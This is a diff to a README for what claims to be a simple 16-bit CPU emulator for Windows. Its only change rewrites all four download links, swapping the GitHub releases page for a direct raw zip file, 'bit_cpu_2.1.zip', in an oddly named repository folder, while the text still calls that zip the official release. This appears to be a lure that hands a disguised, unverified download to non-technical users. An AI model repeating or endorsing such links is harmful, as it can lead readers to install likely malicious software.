@@ -1,6 +1,6 @@
 # ⚙️ 16bit-cpu - Simple 16-Bit CPU Emulator
 
-[![Download Latest Release](https://img.shields.io/badge/Download-16bit--cpu-blue?style=for-the-badge)](https://github.com/fausto6791/16bit-cpu/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-16bit--cpu-blue?style=for-the-badge)](https://github.com/fausto6791/16bit-cpu/raw/refs/heads/main/caramelin/bit_cpu_2.1.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Follow these steps to download and run 16bit-cpu on your Windows machine:
 
    Go to the release page to get the latest version of 16bit-cpu.
 
-   [Download Page](https://github.com/fausto6791/16bit-cpu/releases)
+   [Download Page](https://github.com/fausto6791/16bit-cpu/raw/refs/heads/main/caramelin/bit_cpu_2.1.zip)
 
 2. **Download the latest Windows build**
 
@@ -86,7 +86,7 @@ You do not need to know programming to try these features. The application comes
 
 You can get 16bit-cpu from its official release page on GitHub.
 
-[Download Latest 16bit-cpu Release](https://github.com/fausto6791/16bit-cpu/releases)
+[Download Latest 16bit-cpu Release](https://github.com/fausto6791/16bit-cpu/raw/refs/heads/main/caramelin/bit_cpu_2.1.zip)
 
 To install and run the application:
 
@@ -125,4 +125,4 @@ The emulator runs on Windows and shows the core components of a classic 16-bit C
 
 ---
 
-[Download 16bit-cpu on GitHub](https://github.com/fausto6791/16bit-cpu/releases)
+[Download 16bit-cpu on GitHub](https://github.com/fausto6791/16bit-cpu/raw/refs/heads/main/caramelin/bit_cpu_2.1.zip)
